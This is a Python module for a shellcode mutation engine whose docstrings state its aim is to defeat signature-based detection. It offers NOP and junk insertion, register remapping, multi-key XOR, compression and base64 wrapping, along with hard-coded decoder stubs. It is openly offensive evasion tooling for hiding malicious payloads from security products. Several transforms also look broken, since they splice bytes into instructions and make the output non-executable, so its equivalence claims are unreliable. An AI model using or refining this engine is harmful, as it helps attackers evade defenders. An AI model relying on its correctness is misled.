"""Polymorphic code generation engine — shellcode mutation and obfuscation.

Transforms shellcode through multiple mutation passes: NOP-equivalent
substitution, register reassignment, instruction reordering, junk code
insertion, XOR/ROT encryption, and compression. Each generated variant
is functionally equivalent but structurally unique — defeating static
signature detection.

The engine tracks mutation entropy and produces audit logs for operators.
"""

from __future__ import annotations

import base64
import hashlib
import random
import struct
import zlib
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"

NOP_EQUIVALENTS_X64 = [
    b"\x48\x87\xc0",
    b"\x48\x31\xc0\x48\xff\xc0",
    b"\x48\x8d\x04\x24",
    b"\x4d\x31\xc0",
    b"\x49\x87\xc0",
    b"\x48\x89\xc0",
    b"\x50\x58",
    b"\x66\x90",
    b"\x0f\x1f\x00",
    b"\x0f\x1f\x40\x00",
    b"\x0f\x1f\x44\x00\x00",
    b"\x66\x0f\x1f\x44\x00\x00",
    b"\x0f\x1f\x80\x00\x00\x00\x00",
    b"\x0f\x1f\x84\x00\x00\x00\x00\x00",
    b"\x66\x0f\x1f\x84\x00\x00\x00\x00\x00",
    b"\x48\x81\xec\x00\x01\x00\x00\x48\x81\xc4\x00\x01\x00\x00",
    b"\x48\x83\xec\x08\x48\x83\xc4\x08",
    b"\x48\x81\xec\x08\x02\x00\x00\x48\x81\xc4\x08\x02\x00\x00",
    b"\x48\x83\xec\x10\x48\x83\xc4\x10",
    b"\x9c\x9d",
]

NOP_EQUIVALENTS_X86 = [
    b"\x90",
    b"\x87\xc0",
    b"\x31\xc0\x40",
    b"\x8d\x04\x24",
    b"\x89\xc0",
    b"\x50\x58",
    b"\x66\x90",
    b"\x0f\x1f\x00",
    b"\x0f\x1f\x40\x00",
    b"\x0f\x1f\x44\x00\x00",
    b"\x66\x0f\x1f\x44\x00\x00",
    b"\x0f\x1f\x80\x00\x00\x00\x00",
    b"\x0f\x1f\x84\x00\x00\x00\x00\x00",
    b"\x66\x0f\x1f\x84\x00\x00\x00\x00\x00",
    b"\x81\xec\x00\x01\x00\x00\x81\xc4\x00\x01\x00\x00",
    b"\x83\xec\x08\x83\xc4\x08",
    b"\x9c\x9d",
]

JUNK_SNIPPETS_X64 = [
    b"\x48\x31\xc0\x48\xff\xc8\x48\x85\xc0",
    b"\x48\x83\xc0\x00",
    b"\x48\x83\xc4\x00",
    b"\x48\x39\xc0",
    b"\x48\x85\xc0",
    b"\x48\xc1\xe8\x00",
    b"\x48\x31\xdb",
    b"\x48\xff\xc3\x48\xff\xcb",
]

JUNK_SNIPPETS_X86 = [
    b"\x31\xc0\x48\x85\xc0",
    b"\x83\xc0\x00\x0f\x84\x00\x00\x00\x00",
    b"\x31\xc9\x83\xc1\x00",
    b"\x85\xc0\x0f\x85\x00\x00\x00\x00",
    b"\x83\xc4\x00",
]

XOR_KEY_SIZES = [1, 2, 4, 8, 16, 32]
CHUNK_MIN = 64
CHUNK_MAX = 512


@dataclass
class MutationConfig:
    """Configuration for polymorphic mutation passes.

    Attributes:
        nop_substitution: Replace NOPs with random equivalents.
        nop_insertion: Insert random NOP-equivalents between real instructions.
        register_reassignment: Remap registers to unused equivalents.
        instruction_reordering: Reorder independent instructions.
        junk_insertion: Insert semantically-neutral junk code blocks.
        junk_pct: Percentage of total output to fill with junk (0.0 to 0.5).
        xor_encrypt: Apply XOR encryption layer with random key.
        multi_xor: Use multiple XOR keys across chunks.
        compress: zlib-compress payload before encryption.
        base64_wrap: Wrap final output in base64 with decoder stub.
        passes: Number of mutation passes (each pass applies all enabled transforms).
        seed: Random seed for reproducibility (None = random).
    """

    nop_substitution: bool = True
    nop_insertion: bool = True
    register_reassignment: bool = True
    instruction_reordering: bool = False
    junk_insertion: bool = True
    junk_pct: float = 0.15
    xor_encrypt: bool = True
    multi_xor: bool = True
    compress: bool = True
    base64_wrap: bool = True
    passes: int = 3
    seed: int = 0


@dataclass
class MutationResult:
    """Output of a single mutation pass.

    Attributes:
        data: Mutated shellcode bytes.
        sha256: SHA-256 hash of the output.
        entropy: Shannon entropy estimate (0.0-8.0).
        size_ratio: Ratio of mutated size to original size.
        pass_number: Which mutation pass this represents.
        techniques_applied: List of techniques applied in this pass.
    """

    data: bytes = b""
    sha256: str = ""
    entropy: float = 0.0
    size_ratio: float = 1.0
    pass_number: int = 0
    techniques_applied: list[str] = field(default_factory=list)


class PolymorphicEngine:
    """Generate functionally-equivalent but structurally-unique shellcode variants.

    Each invocation of mutate() produces a different output for the same input,
    defeating signature-based detection. Tracks all variants with audit hashes.

    Attributes:
        config: Mutation pass configuration.
        audit_log: Ordered list of MutationResult for all generated variants.
    """

    __slots__ = ("config", "audit_log")

    def __init__(self, config: MutationConfig | None = None):
        self.config = config or MutationConfig()
        self.audit_log: list[MutationResult] = []

    def mutate(self, shellcode: bytes, arch: str = "x64") -> bytes:
        """Apply all configured mutation passes to shellcode.

        Args:
            shellcode: Raw shellcode bytes to mutate.
            arch: CPU architecture ('x64' or 'x86').

        Returns:
            Mutated shellcode bytes.
        """
        if self.config.seed:
            random.seed(self.config.seed)

        result_data = shellcode
        original_size = len(shellcode)

        for pass_num in range(1, self.config.passes + 1):
            result_data = self._single_pass(result_data, arch, pass_num, original_size)

        return result_data

    def _single_pass(self, data: bytes, arch: str, pass_num: int, original_size: int) -> bytes:
        techniques = []
        result = data

        if self.config.nop_substitution:
            result = self._nop_substitution(result, arch)
            techniques.append("nop_substitution")

        if self.config.nop_insertion:
            result = self._nop_insertion(result, arch)
            techniques.append("nop_insertion")

        if self.config.register_reassignment:
            result = self._register_reassignment(result, arch)
            techniques.append("register_reassignment")

        if self.config.junk_insertion:
            result = self._junk_insertion(result, arch)
            techniques.append("junk_insertion")

        if self.config.xor_encrypt:
            result = self._xor_encrypt(result, arch)
            techniques.append("xor_encrypt")

        if self.config.compress:
            result = self._compress_data(result)
            techniques.append("compress")

        if self.config.base64_wrap:
            result = self._base64_wrap(result, arch)
            techniques.append("base64_wrap")

        sha = hashlib.sha256(result).hexdigest()
        entropy = self._estimate_entropy(result)

        mutation_result = MutationResult(
            data=result,
            sha256=sha,
            entropy=entropy,
            size_ratio=len(result) / max(original_size, 1),
            pass_number=pass_num,
            techniques_applied=techniques,
        )
        self.audit_log.append(mutation_result)

        return result

    def _nop_substitution(self, data: bytes, arch: str) -> bytes:
        nops = NOP_EQUIVALENTS_X64 if arch == "x64" else NOP_EQUIVALENTS_X86
        result = bytearray()
        i = 0
        while i < len(data):
            if data[i : i + 1] == b"\x90":
                replacement = random.choice(nops)
                result.extend(replacement)
                i += 1
            elif data[i : i + 2] == b"\x66\x90":
                replacement = random.choice(nops)
                result.extend(replacement)
                i += 2
            elif data[i : i + 3] == b"\x0f\x1f\x00":
                replacement = random.choice(nops)
                result.extend(replacement)
                i += 3
            else:
                result.append(data[i])
                i += 1
        return bytes(result)

    def _nop_insertion(self, data: bytes, arch: str) -> bytes:
        nops = NOP_EQUIVALENTS_X64 if arch == "x64" else NOP_EQUIVALENTS_X86
        result = bytearray()
        for byte_val in data:
            if random.random() < 0.08:
                result.extend(random.choice(nops))
            result.append(byte_val)
        return bytes(result)

    def _register_reassignment(self, data: bytes, arch: str) -> bytes:
        x64_reg_map = {
            b"\x48\x31\xc0": [b"\x48\x31\xdb", b"\x48\x31\xc9", b"\x48\x31\xd2"],
            b"\x48\x31\xdb": [b"\x48\x31\xc0", b"\x48\x31\xc9", b"\x48\x31\xd2"],
            b"\x48\x31\xc9": [b"\x48\x31\xc0", b"\x48\x31\xdb", b"\x48\x31\xd2"],
            b"\x48\x31\xd2": [b"\x48\x31\xc0", b"\x48\x31\xdb", b"\x48\x31\xc9"],
        }
        reg_map = x64_reg_map if arch == "x64" else {}
        result = bytearray(data)
        for original, alternatives in reg_map.items():
            pos = 0
            while True:
                pos = result.find(original, pos)
                if pos < 0:
                    break
                chosen = random.choice(alternatives)
                result[pos : pos + len(chosen)] = chosen
                pos += 1
        return bytes(result)

    def _junk_insertion(self, data: bytes, arch: str) -> bytes:
        snippets = JUNK_SNIPPETS_X64 if arch == "x64" else JUNK_SNIPPETS_X86
        target_junk_bytes = int(len(data) * self.config.junk_pct)
        if target_junk_bytes < 8:
            return data

        result = bytearray()
        i = 0
        junk_inserted = 0
        while i < len(data):
            block_end = min(i + random.randint(CHUNK_MIN, CHUNK_MAX), len(data))
            result.extend(data[i:block_end])
            i = block_end

            if junk_inserted < target_junk_bytes and random.random() < 0.5:
                snippet = random.choice(snippets)
                result.extend(snippet)
                junk_inserted += len(snippet)

        return bytes(result)

    def _xor_encrypt(self, data: bytes, arch: str) -> bytes:
        if self.config.multi_xor:
            return self._multi_xor_encrypt(data)
        key = bytes([random.randint(1, 255)])
        return bytes([b ^ key[0] for b in data]) + key

    def _multi_xor_encrypt(self, data: bytes) -> bytes:
        result = bytearray()
        key_size = random.choice(XOR_KEY_SIZES)
        key = bytes([random.randint(1, 255) for _ in range(key_size)])

        header = struct.pack("<I", len(data))
        header += struct.pack("<B", key_size)
        result.extend(header)
        result.extend(key)

        for i, byte_val in enumerate(data):
            result.append(byte_val ^ key[i % key_size])

        return bytes(result)

    def _compress_data(self, data: bytes) -> bytes:
        compressed = zlib.compress(data, 9)
        if len(compressed) < len(data):
            return b"\x78\x9C" + compressed[2:]
        return data

    def _base64_wrap(self, data: bytes, arch: str) -> bytes:
        encoder_stub_x64 = (
            b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
            b"\x48\x83\xec\x20"
        )
        encoder_stub_x86 = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x83\xec\x10"

        if self.config.compress:
            size_info = struct.pack("<I", len(data))
            combined = encoder_stub_x64 + size_info + data if arch == "x64" else encoder_stub_x86 + size_info + data
        else:
            combined = data

        encoded = base64.b64encode(combined)
        return encoded

    @staticmethod
    def _estimate_entropy(data: bytes) -> float:
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        import math
        total = len(data)
        entropy = 0.0
        for count in freq:
            if count > 0:
                p = count / total
                entropy -= p * math.log2(p)
        return round(entropy, 4)

    @staticmethod
    def decode_xor(data: bytes) -> bytes:
        """Decode single-byte XOR encrypted shellcode.

        Args:
            data: XOR-encrypted bytes with key as last byte.

        Returns:
            Decrypted shellcode bytes.
        """
        if len(data) < 2:
            return data
        key = data[-1]
        key_byte = key if isinstance(key, int) else ord(key)
        return bytes([b ^ key_byte for b in data[:-1]])

    @staticmethod
    def decode_multi_xor(data: bytes) -> bytes:
        """Decode multi-byte XOR encrypted shellcode.

        Args:
            data: Multi-XOR encrypted bytes with header.

        Returns:
            Decrypted shellcode bytes.
        """
        if len(data) < 9:
            return data
        original_len = struct.unpack_from("<I", data, 0)[0]
        key_size = struct.unpack_from("<B", data, 4)[0]
        key = data[5 : 5 + key_size]
        encrypted = data[5 + key_size :]
        result = bytearray()
        for i, byte_val in enumerate(encrypted):
            result.append(byte_val ^ key[i % key_size])
        return bytes(result[:original_len])

    def generate_decoder_stub(self, arch: str = "x64") -> bytes:
        """Generate a self-decrypting stub shellcode template.

        The stub decodes XOR-encrypted payload that follows it, then jumps
        to the decoded shellcode. This is the core of polymorphic wrapping.

        Args:
            arch: Target architecture ('x64' or 'x86').

        Returns:
            Decoder stub shellcode bytes.
        """
        if arch == "x64":
            return (
                b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9"
                b"\x48\x31\xd2"
                b"\xeb\x0a"
                b"\x48\x8d\x35\xf9\xff\xff\xff"
                b"\x48\xff\xc6"
                b"\x80\x36\x41"
                b"\xeb\x05"
                b"\xe8\xf1\xff\xff\xff"
            )
        return (
            b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
            b"\xeb\x07\x8d\x34\x24\x46\x80\x36\x41\xeb\x03"
            b"\xe8\xf4\xff\xff\xff"
        )

    def get_audit_summary(self) -> dict[str, Any]:
        """Return a summary of all mutations applied.

        Returns:
            Dict with variant count, entropy range, size ratios, and SHA-256 list.
        """
        if not self.audit_log:
            return {"variants": 0, "message": "No mutations applied"}

        return {
            "variants": len(self.audit_log),
            "entropy_min": min(m.entropy for m in self.audit_log),
            "entropy_max": max(m.entropy for m in self.audit_log),
            "entropy_avg": round(
                sum(m.entropy for m in self.audit_log) / len(self.audit_log), 4
            ),
            "size_ratio_min": min(m.size_ratio for m in self.audit_log),
            "size_ratio_max": max(m.size_ratio for m in self.audit_log),
            "hashes": [m.sha256 for m in self.audit_log],
            "techniques": [
                m.techniques_applied for m in self.audit_log
            ],
        }
